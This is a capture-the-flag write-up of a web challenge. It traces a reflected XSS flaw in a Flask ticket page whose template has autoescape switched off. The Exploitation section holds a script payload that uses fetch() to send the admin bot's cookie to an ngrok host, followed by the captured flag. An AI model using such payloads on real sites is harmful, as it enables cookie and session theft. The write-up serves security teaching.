# Baby Web

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- 152 solves / 50 points
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This website seems to have an issue. Let's report it to the admins.

- Junhua

[http://34.124.157.94:5006/](http://34.124.157.94:5006/)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Grey-Cat-The-Flag-2023-Qualifiers/images/Pasted%20image%2020230519221707.png)

In here, we can report an issue to admins, and it says "Only admins with a special cookie can see the tickets.".

***So, our goal is to exploit some client-side vulnerabilities like Cross-Site Scripting (XSS) to exfiltrate the admin bot's cookie??***

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Grey-Cat-The-Flag-2023-Qualifiers/Web/Baby-Web/dist.zip):**
```shell
┌[siunam♥earth]-(~/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/Baby-Web)-[2023.05.19|22:18:31(HKT)]
└> file dist.zip 
dist.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥earth]-(~/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/Baby-Web)-[2023.05.19|22:18:31(HKT)]
└> unzip dist.zip 
Archive:  dist.zip
  inflating: adminbot.py             
  inflating: constants.py            
  inflating: dockerfile              
 extracting: requirements.txt        
  inflating: server.py               
  inflating: templates/base.html     
  inflating: templates/index.html    
  inflating: templates/ticket.html   
```

In `server.py`, we can see how all the routes are being implemented.

**In route `/`, we see this:**
```python
BASE_URL = "http://localhost:5000/"


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == "GET":
        return render_template('index.html')
    
    message = request.form.get('message')
    if len(message) == 0:
        flash("Please enter a message")
        return render_template('index.html')

    link = f"/ticket?message={quote(message)}"

    # Admin vists the link here
    visit(BASE_URL, f"{BASE_URL}{link}")

    return redirect(link)
```

When we send a POST request to route `/`, it'll parse our ticket's message to a link: `/ticket?message={quote(message)}`, then the admin bot will visit the link at `http://localhost:5000/ticket?message={quote(message)}`. Finally, we'll be redirected to `/ticket` with GET parameter `message`.

**Route `/ticket`:**
```python
@app.route('/ticket', methods=['GET'])
def ticket_display():
    message = request.args.get('message')
    return render_template('ticket.html', message=message)
```

When GET parameter `message` is provided, it'll parse the `message` to `ticket.html` template and render it.

**Template `ticket.html`:**
```html
{% extends 'base.html' %}
{% block content %}
<h1>This is your admin ticket content</h1>
{% autoescape false %} {{ message }} {% endautoescape %}
{% endblock %}
```

Hmm? **`autoescape` set to `false`?**

According to [CodeQL documentation](https://codeql.github.com/codeql-query-help/python/py-jinja2-autoescape-false/), it said:

> Cross-site scripting (XSS) attacks can occur if untrusted input is not escaped. This applies to templates as well as code. The `jinja2` templates may be vulnerable to XSS if the environment has `autoescape` set to `False`. Unfortunately, `jinja2` sets `autoescape` to `False` by default. Explicitly setting `autoescape` to `True` when creating an `Environment` object will prevent this.

That being said, **template `ticket.html` should be vulnerable to XSS.**

```html
/ticket?message=<script>alert(document.domain)</script>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Grey-Cat-The-Flag-2023-Qualifiers/images/Pasted%20image%2020230519223905.png)

But how the admin bot visit the link?

**In `adminbot.py`, we see this:**
```python
from selenium import webdriver
from constants import COOKIE
import multiprocessing
from webdriver_manager.chrome import ChromeDriverManager

options = webdriver.ChromeOptions()
options.add_argument("--headless")
options.add_argument("--incognito")
options.add_argument("--disable-dev-shm-usage")
options.add_argument("--no-sandbox")

def visit(baseUrl: str, link: str) -> str:
    """Visit the website"""
    p = multiprocessing.Process(target=_visit, args=(baseUrl, link))
    p.start()
    return f"Visiting {link}"

def _visit(baseUrl:str, link: str) -> str:
    """Visit the website"""
    with webdriver.Chrome(ChromeDriverManager().install(), options=options) as driver:
        try:
            driver.get(f'{baseUrl}/')
            cookie = {"name": "flag", "value": COOKIE["flag"]}
            driver.add_cookie(cookie)
            driver.get(link)
            return f"Visited {link}"
        except:
            return f"Connection Error: {link}"
```

Basically it first visit `http://localhost:5000/`, then, add cookie `flag` with the flag value. Finally, visit the `link`, which is `/ticket?message={quote(message)}`.

> Note: The `quote` from `urllib.parse` library is to URL encode the message, nothing to do with XSS protection. Also, the `flag` cookie doesn't have HttpOnly enabled, this allows us to use `document.cookie` API to fetch the cookie's value.

## Exploitation

**With that said, we can craft a payload that sends the admin bot's flag cookie:**

- Setup a port forwarding service, like Ngrok:

```shell
┌[siunam♥earth]-(~/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/Baby-Web)-[2023.05.19|22:49:25(HKT)]
└> ngrok http 80
[...]
Forwarding                    https://d347-{Redacted}.ngrok-free.app -> http://localhost:80            
[...]
```

- Setup a web server, like Python's `http.server`:

```shell
┌[siunam♥earth]-(~/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/Baby-Web)-[2023.05.19|22:50:04(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Submit a new ticket with the following XSS payload:

```html
<script>fetch(`https://d347-{Redacted}.ngrok-free.app/?c=${document.cookie}`);</script>
```

This payload will send a GET request to my Ngrok port forwarding service with GET paremeter `c` and the `flag`'s cookie value using `fetch()` API.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Grey-Cat-The-Flag-2023-Qualifiers/images/Pasted%20image%2020230519231102.png)

```shell
┌[siunam♥earth]-(~/ctf/Grey-Cat-The-Flag-2023-Qualifiers/Web/Baby-Web)-[2023.05.19|22:50:04(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [19/May/2023 23:08:45] "GET /?c= HTTP/1.1" 200 -
127.0.0.1 - - [19/May/2023 23:08:45] "GET /?c=flag=grey{b4by_x55_347cbd01cbc74d13054b20f55ea6a42c} HTTP/1.1" 200 -
```

We got the flag!

- **Flag: `grey{b4by_x55_347cbd01cbc74d13054b20f55ea6a42c}`**

## Conclusion

What we've learned:

1. Leaking Cookies Via Reflected XSS